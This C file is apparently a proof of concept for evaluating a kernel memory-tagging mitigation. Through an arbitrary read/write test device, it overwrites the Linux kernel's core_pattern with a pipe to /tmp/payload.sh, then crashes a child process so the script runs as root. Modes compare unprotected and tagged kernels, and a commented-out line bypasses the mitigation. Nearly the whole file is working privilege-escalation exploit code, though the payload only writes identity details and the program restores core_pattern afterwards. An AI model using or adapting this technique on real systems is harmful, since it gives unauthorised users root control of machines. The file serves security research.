// FZY: Add a simple privilege escalation proof of concept that overwrites the core_pattern to execute a payload script on crash

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define CORENAME_MAX_SIZE 256

struct arb_request {
  unsigned long addr;
  void *data;
  size_t size;
};

#define ARB_READ _IOR('A', 1, struct arb_request)
#define ARB_WRITE _IOW('A', 2, struct arb_request)

// FZY: Tagged read/write via ld_sdp_000/sd_sdp_000 (fixed, mismatching TTag).
struct arb_tagged_request {
  unsigned long addr;     // Kernel address to access
  unsigned long value;    // Store: value to write; Load: filled with the result
  int           is_write; // 0 = ld_sdp (load), 1 = sd_sdp (store)
};

#define ARB_TAGGED_RW _IOWR('A', 13, struct arb_tagged_request)

void arb_read(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};

  if (ioctl(fd, ARB_READ, &req) < 0) {
    perror("arb_read");
    exit(1);
  }
}

void arb_write(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};

  if (ioctl(fd, ARB_WRITE, &req) < 0) {
    perror("arb_write");
    exit(1);
  }
}

// Read one 8-byte word at `addr` with a tagged ld_sdp, emulating an attacker
// reaching for the tagged load to touch the SDP-protected core_pattern pointer.
// On an enforcing SDP kernel its fixed TTag misses the pointer's object TTag and
// traps here (attack fails).
unsigned long arb_tagged_read(int fd, unsigned long addr) {
  struct arb_tagged_request req = {.addr = addr, .value = 0, .is_write = 0};

  if (ioctl(fd, ARB_TAGGED_RW, &req) < 0) {
    perror("arb_tagged_read");
    exit(1);
  }
  return req.value;
}

void verify_core_pattern_addr(int fd, unsigned long core_pattern_addr) {
  printf("[+] core_pattern address: 0x%lx\n", core_pattern_addr);

  // Read current core_pattern to verify if our address is correct
  FILE *f = fopen("/proc/sys/kernel/core_pattern", "r");
  if (f) {
    char current_pattern[CORENAME_MAX_SIZE + 1];
    memset(current_pattern, 0, sizeof(current_pattern));
    if (fgets(current_pattern, CORENAME_MAX_SIZE, f)) {

      current_pattern[strcspn(current_pattern, "\n")] = 0;
      printf("[+] Current core_pattern from /proc: '%s'\n", current_pattern);

      char kernel_pattern[CORENAME_MAX_SIZE + 1];
      memset(kernel_pattern, 0, sizeof(kernel_pattern));

      arb_read(fd, core_pattern_addr, kernel_pattern, CORENAME_MAX_SIZE);
      printf("[+] core_pattern from kernel memory: '%s'\n", kernel_pattern);

      if (strncmp(current_pattern, kernel_pattern, strlen(current_pattern)) == 0) {
        printf("[+] Address verification successful!\n");
      } else {
        printf("[!] Warning: Address verification failed!\n");
        exit(1);
      }
    }
    fclose(f);
  }
}

void create_payload() {
  printf("[+] Creating payload script...\n");

  FILE *f = fopen("/tmp/payload.sh", "w");
  if (!f) {
    perror("fopen payload");
    exit(1);
  }

  fprintf(f, "#!/bin/bash\n");
  fprintf(f, "echo 'Payload executed as root!' > /tmp/pwned\n");
  fprintf(f, "echo 'UID:' $(id -u) >> /tmp/pwned\n");
  fprintf(f, "echo 'GID:' $(id -g) >> /tmp/pwned\n");
  fprintf(f, "echo 'Effective User:' $(whoami) >> /tmp/pwned\n");
  // The payload runs as root and /tmp is sticky, so hand the marker back or
  // cleanup cannot unlink it.
  fprintf(f, "chown %d:%d /tmp/pwned\n", getuid(), getgid());

  fclose(f);

  chmod("/tmp/payload.sh", 0755);
  printf("[+] Payload created at /tmp/payload.sh\n");
}

static char orig_core_pattern[CORENAME_MAX_SIZE + 1];

void overwrite_core_pattern(int fd, unsigned long core_pattern_addr) {
  char malicious_pattern[] = "|/tmp/payload.sh %p %u %g %s %t %h %e";

  memset(orig_core_pattern, 0, sizeof(orig_core_pattern));
  arb_read(fd, core_pattern_addr, orig_core_pattern, CORENAME_MAX_SIZE);

  printf("[+] Overwriting core_pattern at 0x%lx\n", core_pattern_addr);
  printf("[+] New pattern: %s\n", malicious_pattern);

  // Write our malicious pattern
  arb_write(fd, core_pattern_addr, malicious_pattern, strlen(malicious_pattern) + 1);

  printf("[+] core_pattern overwritten!\n");
}

void trigger_core_dump() {
  printf("[+] Triggering core dump to execute payload...\n");

  pid_t pid = fork();

  if (pid == 0) {
    // Child process: Cause segfault to trigger core dump
    int *p = NULL;
    *p = 0xDEADBEEF;
  } else if (pid > 0) {
    // Parent process: Wait for child
    int status;
    wait(&status);
    printf("[+] Child process crashed, core dump should have been processed\n");
  } else {
    perror("fork");
    exit(1);
  }
}

void verify_exploit() {
  printf("[+] Checking if exploit worked...\n");

  // Wait a moment for the core dump handler to execute
  sleep(2);

  if (access("/tmp/pwned", F_OK) == 0) {
    printf("[+] Payload executed successfully!\n");
    system("cat /tmp/pwned");
  } else {
    printf("[-] Payload did not execute\n");
    return;
  }
}

// Without this the box keeps piping every core dump into /tmp/payload.sh.
void restore_core_pattern(int fd, unsigned long core_pattern_addr) {
  char readback[CORENAME_MAX_SIZE + 1];

  memset(readback, 0, sizeof(readback));
  arb_write(fd, core_pattern_addr, orig_core_pattern,
            strlen(orig_core_pattern) + 1);
  arb_read(fd, core_pattern_addr, readback, CORENAME_MAX_SIZE);
  if (strcmp(readback, orig_core_pattern) == 0)
    printf("[+] core_pattern restored to '%s'\n", orig_core_pattern);
  else
    printf("[-] core_pattern restore failed, now: '%s'\n", readback);

  unlink("/tmp/pwned");
  unlink("/tmp/payload.sh");
}

int main(int argc, char *argv[]) {
  printf("[+] Privilege escalation PoC by overwriting core_pattern\n");

  if (argc != 3) {
    printf("Usage: %s <mode> <core_pattern_addr>\n", argv[0]);
    printf("\t- mode: 0 for no protection, 1 for Sensitivity Tag, "
           "2 for Sensitivity and TypeID Tag,\n"
           "\t        3 to read the protected pointer with a tagged ld_sdp "
           "(mismatching tag, so it traps on an SDP kernel).\n");
    printf("\t- core_pattern_addr: nm vmlinux | grep core_pattern\n");
    return 1;
  }

  printf("[+] Opening /dev/arb_rw...\n");

  int arbrw_dev_fd = open("/dev/arb_rw", O_RDWR);
  if (arbrw_dev_fd < 0) {
    perror("open");
    exit(1);
  }

  printf("[+] Device opened successfully\n");
  printf("[+] Current UID: %d\n", getuid());

  create_payload();
  
  int mode = atoi(argv[1]);
  if (mode < 0 || mode > 3) {
    printf("Invalid mode. Use 0 for no protection, "
      "1 for protection with Sensitivity Tag, "
      "2 for protection with Sensitivity and TypeID Tag, "
      "and 3 for a tagged-instruction read.\n");
    close(arbrw_dev_fd);
    return 1;
  }

  unsigned long core_pattern_addr = strtoul(argv[2], NULL, 16);

  if (mode == 3) {
    // Attacker reaches for a tagged ld_sdp to read the SDP-protected
    // core_pattern pointer. Its fixed TTag misses the pointer's object TTag, so
    // on an enforcing kernel it traps here and the attack fails.
    printf("[+] Reading protected core_pattern pointer via tagged ld_sdp\n");
    core_pattern_addr = arb_tagged_read(arbrw_dev_fd, core_pattern_addr);
    printf("[+] core_pattern pointer from tagged read: 0x%lx\n", core_pattern_addr);
  } else if (mode != 0) {
    // Get the address of core_pattern from the kernel with arb_read, because we store the address of core_pattern in the global variable and store the string content at unpredictable address
    arb_read(arbrw_dev_fd, core_pattern_addr, &core_pattern_addr, sizeof(unsigned long));

    printf("[+] core_pattern address from kernel memory: 0x%lx\n", core_pattern_addr);

    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
    // core_pattern_addr = core_pattern_addr | 0xFFFF000000000000;
  }
  
  verify_core_pattern_addr(arbrw_dev_fd, core_pattern_addr);

  overwrite_core_pattern(arbrw_dev_fd, core_pattern_addr);

  trigger_core_dump();

  verify_exploit();

  restore_core_pattern(arbrw_dev_fd, core_pattern_addr);

  close(arbrw_dev_fd);
  return 0;
}